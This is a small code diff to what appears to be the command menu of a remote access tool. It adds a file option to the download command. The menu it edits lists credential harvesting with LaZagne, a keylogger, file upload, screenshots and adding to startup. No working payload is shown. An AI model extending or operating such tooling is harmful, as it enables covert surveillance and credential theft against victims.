@@ -95,6 +95,7 @@ MENU_INTERACT_PWD_PASS = "password"
 
 MENU_INTERACT_VULN_EXP_ONLY = "exploit-only"
 
+MENU_INTERACT_DWNL_FILE = "file"
 MENU_INTERACT_DWNL_DIR = "directory"
 
 SERVER_INTERACT_COMMAND_LIST = [{"arg": MENU_HELP, "info": "Help"},
@@ -111,7 +112,7 @@ SERVER_INTERACT_COMMAND_LIST = [{"arg": MENU_HELP, "info": "Help"},
                                  "note": "using LaZagne"},
                                 {"arg": MENU_INTERACT_KEYLOG, "info": "Keylogger",
                                  "arg2": f"({MENU_INTERACT_KEYLOG_START}) ({MENU_INTERACT_KEYLOG_STOP}) ({MENU_INTERACT_KEYLOG_DUMP})"},
-                                {"arg": MENU_INTERACT_DWNL, "info": "Download file", "optional_arg2": f"({MENU_INTERACT_DWNL_DIR})"},
+                                {"arg": MENU_INTERACT_DWNL, "info": "Download", "arg2": f"({MENU_INTERACT_DWNL_DIR}) ({MENU_INTERACT_DWNL_FILE})"},
                                 {"arg": MENU_INTERACT_UPLOAD, "info": "Upload file"},
                                 {"arg": MENU_INTERACT_SCRN, "info": "Take screenshot"},
                                 {"arg": MENU_INTERACT_STARTUP, "info": "Add to startup",
